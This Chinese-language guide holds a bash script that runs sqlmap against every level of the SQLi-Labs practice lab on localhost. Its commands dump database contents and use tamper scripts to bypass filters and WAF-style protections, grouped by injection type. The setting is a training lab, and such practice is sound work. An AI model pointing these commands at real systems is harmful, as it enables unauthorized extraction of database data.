# 批量扫描执行脚本

依次执行全部 7 个分类的 sqlmap 命令。

## 配置

修改下方 `TARGET` 变量指向你的靶机地址：

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行顺序

| 序号 | 脚本 | 范围 |
|------|------|------|
| 1 | `01_get_basic.md` | GET 基础注入 (Less 1-10) |
| 2 | `02_post_basic.md` | POST/Header 注入 (Less 11-22) |
| 3 | `03_waf_bypass.md` | WAF/过滤绕过关卡 (Less 23-31) |
| 4 | `04_widebyte.md` | 宽字节注入 (Less 32-37) |
| 5 | `05_stacked.md` | 堆叠查询注入 (Less 38-45) |
| 6 | `06_orderby.md` | ORDER BY 注入 (Less 46-53) |
| 7 | `07_challenges.md` | 挑战关卡 (Less 54-65) |

## 一键脚本

将以下内容保存为 `run_all.sh`，给执行权限后运行：

```bash
#!/bin/bash
# run_all.sh - SQLi-Labs 批量扫描
# Usage: bash run_all.sh
set -e

TARGET="${TARGET:-http://localhost:8080}"
RESULTS_DIR="./results"
mkdir -p "$RESULTS_DIR"

echo "=============================================="
echo "  SQLi-Labs 批量扫描"
echo "  Target: $TARGET"
echo "=============================================="
echo ""

# --- 1. GET 基础注入 (Less 1-10) ---
echo "=== GET 基础注入 (Less 1-10) ==="

echo "[*] Less-1: 单引号字符型"
sqlmap -u "$TARGET/Less-1/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-1"

echo "[*] Less-2: 数字型"
sqlmap -u "$TARGET/Less-2/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-2"

echo "[*] Less-3: 单引号+括号"
sqlmap -u "$TARGET/Less-3/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-3"

echo "[*] Less-4: 双引号+括号"
sqlmap -u "$TARGET/Less-4/?id=1" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-4"

echo "[*] Less-5: 单引号+报错注入"
sqlmap -u "$TARGET/Less-5/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-5"

echo "[*] Less-6: 双引号+报错注入"
sqlmap -u "$TARGET/Less-6/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-6"

echo "[*] Less-7: 双层括号+文件导出"
sqlmap -u "$TARGET/Less-7/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --prefix="'))" --suffix="-- -" \
    --dump --output-dir="$RESULTS_DIR/Less-7"

echo "[*] Less-8: 单引号+布尔盲注"
sqlmap -u "$TARGET/Less-8/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-8"

echo "[*] Less-9: 单引号+时间盲注"
sqlmap -u "$TARGET/Less-9/?id=1" \
    --batch --random-agent --threads=3 --dbms=mysql \
    --technique=T --time-sec=5 --dump --output-dir="$RESULTS_DIR/Less-9"

echo "[*] Less-10: 双引号+时间盲注"
sqlmap -u "$TARGET/Less-10/?id=1" \
    --batch --random-agent --threads=3 --dbms=mysql \
    --technique=T --time-sec=5 --dump --output-dir="$RESULTS_DIR/Less-10"

# --- 2. POST/Header 注入 (Less 11-22) ---
echo ""
echo "=== POST/Header 注入 (Less 11-22) ==="

echo "[*] Less-11: POST + 单引号"
sqlmap -u "$TARGET/Less-11/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-11"

echo "[*] Less-12: POST + 双引号+括号"
sqlmap -u "$TARGET/Less-12/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-12"

echo "[*] Less-13: POST + 单引号+括号 + 报错注入"
sqlmap -u "$TARGET/Less-13/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-13"

echo "[*] Less-14: POST + 双引号 + 报错注入"
sqlmap -u "$TARGET/Less-14/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-14"

echo "[*] Less-15: POST + 单引号 + 布尔盲注"
sqlmap -u "$TARGET/Less-15/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-15"

echo "[*] Less-16: POST + 双引号+括号 + 布尔盲注"
sqlmap -u "$TARGET/Less-16/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-16"

echo "[*] Less-17: POST + UPDATE 语句 + 报错注入"
sqlmap -u "$TARGET/Less-17/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-17"

echo "[*] Less-18: POST + User-Agent 注入"
sqlmap -u "$TARGET/Less-18/" \
    --data="uname=admin&passwd=admin" \
    --headers="User-Agent: test" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --level=3 --dump --output-dir="$RESULTS_DIR/Less-18"

echo "[*] Less-19: POST + Referer 注入"
sqlmap -u "$TARGET/Less-19/" \
    --data="uname=admin&passwd=admin" \
    --headers="Referer: test" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --level=3 --dump --output-dir="$RESULTS_DIR/Less-19"

echo "[*] Less-20: POST + Cookie 注入"
sqlmap -u "$TARGET/Less-20/" \
    --data="uname=admin&passwd=admin" \
    --cookie="uname=admin" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --level=2 --dump --output-dir="$RESULTS_DIR/Less-20"

echo "[*] Less-21: POST + Cookie 注入 (Base64)"
sqlmap -u "$TARGET/Less-21/" \
    --data="uname=admin&passwd=admin" \
    --cookie="uname=YWRtaW4=" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --tamper=base64encode --level=2 \
    --dump --output-dir="$RESULTS_DIR/Less-21"

echo "[*] Less-22: POST + Cookie 注入 (Base64+双引号)"
sqlmap -u "$TARGET/Less-22/" \
    --data="uname=admin&passwd=admin" \
    --cookie="uname=YWRtaW4=" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --tamper=base64encode --level=2 \
    --dump --output-dir="$RESULTS_DIR/Less-22"

# --- 3. WAF/过滤绕过 (Less 23-31) ---
echo ""
echo "=== WAF/过滤绕过 (Less 23-31) ==="

echo "[*] Less-23: 注释过滤"
sqlmap -u "$TARGET/Less-23/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-23"

echo "[!] Less-24: 二次注入 -- sqlmap 不支持，跳过"

echo "[*] Less-25: OR/AND 过滤"
sqlmap -u "$TARGET/Less-25/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-25"

echo "[*] Less-25a: 数字型 + OR/AND 过滤"
sqlmap -u "$TARGET/Less-25a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-25a"

echo "[*] Less-26: 空格/注释过滤"
sqlmap -u "$TARGET/Less-26/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment,randomcomments \
    --dump --output-dir="$RESULTS_DIR/Less-26"

echo "[*] Less-26a: 单引号+括号 + 空格/注释过滤"
sqlmap -u "$TARGET/Less-26a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment,randomcomments \
    --dump --output-dir="$RESULTS_DIR/Less-26a"

echo "[*] Less-27: 关键字过滤"
sqlmap -u "$TARGET/Less-27/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-27"

echo "[*] Less-27a: 双引号+括号 + 关键字过滤"
sqlmap -u "$TARGET/Less-27a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-27a"

echo "[*] Less-28: 单引号+括号 + 注释过滤"
sqlmap -u "$TARGET/Less-28/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-28"

echo "[*] Less-28a: 双引号+括号 + 注释过滤"
sqlmap -u "$TARGET/Less-28a/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=space2comment \
    --dump --output-dir="$RESULTS_DIR/Less-28a"

echo "[*] Less-29: 双重参数 (HPP)"
sqlmap -u "$TARGET/Less-29/?id=1&id=2" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-29"

echo "[*] Less-30: 双引号 + HPP"
sqlmap -u "$TARGET/Less-30/?id=1&id=2" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-30"

echo "[*] Less-31: 双引号+括号 + HPP"
sqlmap -u "$TARGET/Less-31/?id=1&id=2" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-31"

# --- 4. 宽字节注入 (Less 32-37) ---
echo ""
echo "=== 宽字节注入 (Less 32-37) ==="

echo "[*] Less-32: magic_quotes 宽字节"
sqlmap -u "$TARGET/Less-32/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-32"

echo "[*] Less-33: addslashes 宽字节"
sqlmap -u "$TARGET/Less-33/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-33"

echo "[*] Less-34: POST + 宽字节"
sqlmap -u "$TARGET/Less-34/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-34"

echo "[*] Less-35: 数字型（无需宽字节）"
sqlmap -u "$TARGET/Less-35/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-35"

echo "[*] Less-36: mysql_real_escape_string 宽字节"
sqlmap -u "$TARGET/Less-36/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-36"

echo "[*] Less-37: POST + mysql_real_escape_string 宽字节"
sqlmap -u "$TARGET/Less-37/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-37"

# --- 5. 堆叠查询注入 (Less 38-45) ---
echo ""
echo "=== 堆叠查询注入 (Less 38-45) ==="

echo "[*] Less-38: GET + 单引号 + 堆叠"
sqlmap -u "$TARGET/Less-38/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-38"

echo "[*] Less-39: GET + 数字型 + 堆叠"
sqlmap -u "$TARGET/Less-39/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-39"

echo "[*] Less-40: GET + 单引号+括号 + 堆叠"
sqlmap -u "$TARGET/Less-40/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-40"

echo "[*] Less-41: GET + 数字型 + 堆叠"
sqlmap -u "$TARGET/Less-41/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-41"

echo "[*] Less-42: POST + 单引号 + 堆叠"
sqlmap -u "$TARGET/Less-42/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-42"

echo "[*] Less-43: POST + 单引号+括号 + 堆叠"
sqlmap -u "$TARGET/Less-43/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-43"

echo "[*] Less-44: POST + 单引号 + 堆叠 + 盲注"
sqlmap -u "$TARGET/Less-44/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-44"

echo "[*] Less-45: POST + 单引号+括号 + 堆叠 + 盲注"
sqlmap -u "$TARGET/Less-45/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-45"

# --- 6. ORDER BY 注入 (Less 46-53) ---
echo ""
echo "=== ORDER BY 注入 (Less 46-53) ==="

echo "[*] Less-46: 数字型 + ORDER BY"
sqlmap -u "$TARGET/Less-46/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-46"

echo "[*] Less-47: 单引号 + ORDER BY"
sqlmap -u "$TARGET/Less-47/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-47"

echo "[*] Less-48: 数字型 + ORDER BY + 盲注"
sqlmap -u "$TARGET/Less-48/?sort=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-48"

echo "[*] Less-49: 单引号 + ORDER BY + 盲注"
sqlmap -u "$TARGET/Less-49/?sort=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-49"

echo "[*] Less-50: 数字型 + ORDER BY + 堆叠"
sqlmap -u "$TARGET/Less-50/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-50"

echo "[*] Less-51: 单引号 + ORDER BY + 堆叠"
sqlmap -u "$TARGET/Less-51/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-51"

echo "[*] Less-52: 数字型 + ORDER BY + 堆叠 + 盲注"
sqlmap -u "$TARGET/Less-52/?sort=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-52"

echo "[*] Less-53: 单引号+括号 + ORDER BY + 堆叠 + 盲注"
sqlmap -u "$TARGET/Less-53/?sort=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-53"

# --- 7. 挑战关卡 (Less 54-65) ---
echo ""
echo "=== 挑战关卡 (Less 54-65) ==="
echo "[!] 挑战关有请求次数限制，超限需重置靶场"

echo "[*] Less-54: 单引号 + 随机表名"
sqlmap -u "$TARGET/Less-54/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-54"

# ... (Less 55-65 命令以此类推，见 07_challenges.md)

echo ""
echo "=============================================="
echo "  全部扫描完成。结果保存在 $RESULTS_DIR/"
echo "=============================================="
```

## 使用方式

1. 将上面的代码块保存为 `run_all.sh`
2. 修改 `TARGET` 为你的靶机地址
3. `chmod +x run_all.sh && bash run_all.sh`

或者在另一台机器上逐条复制各分类 `.md` 文件中的命令执行。

---

> 参考：[sqlmap 完整手册](../Tools/sqlmap.md) | [靶场总览](overview.md) | [注入类型详解](injection-types.md)
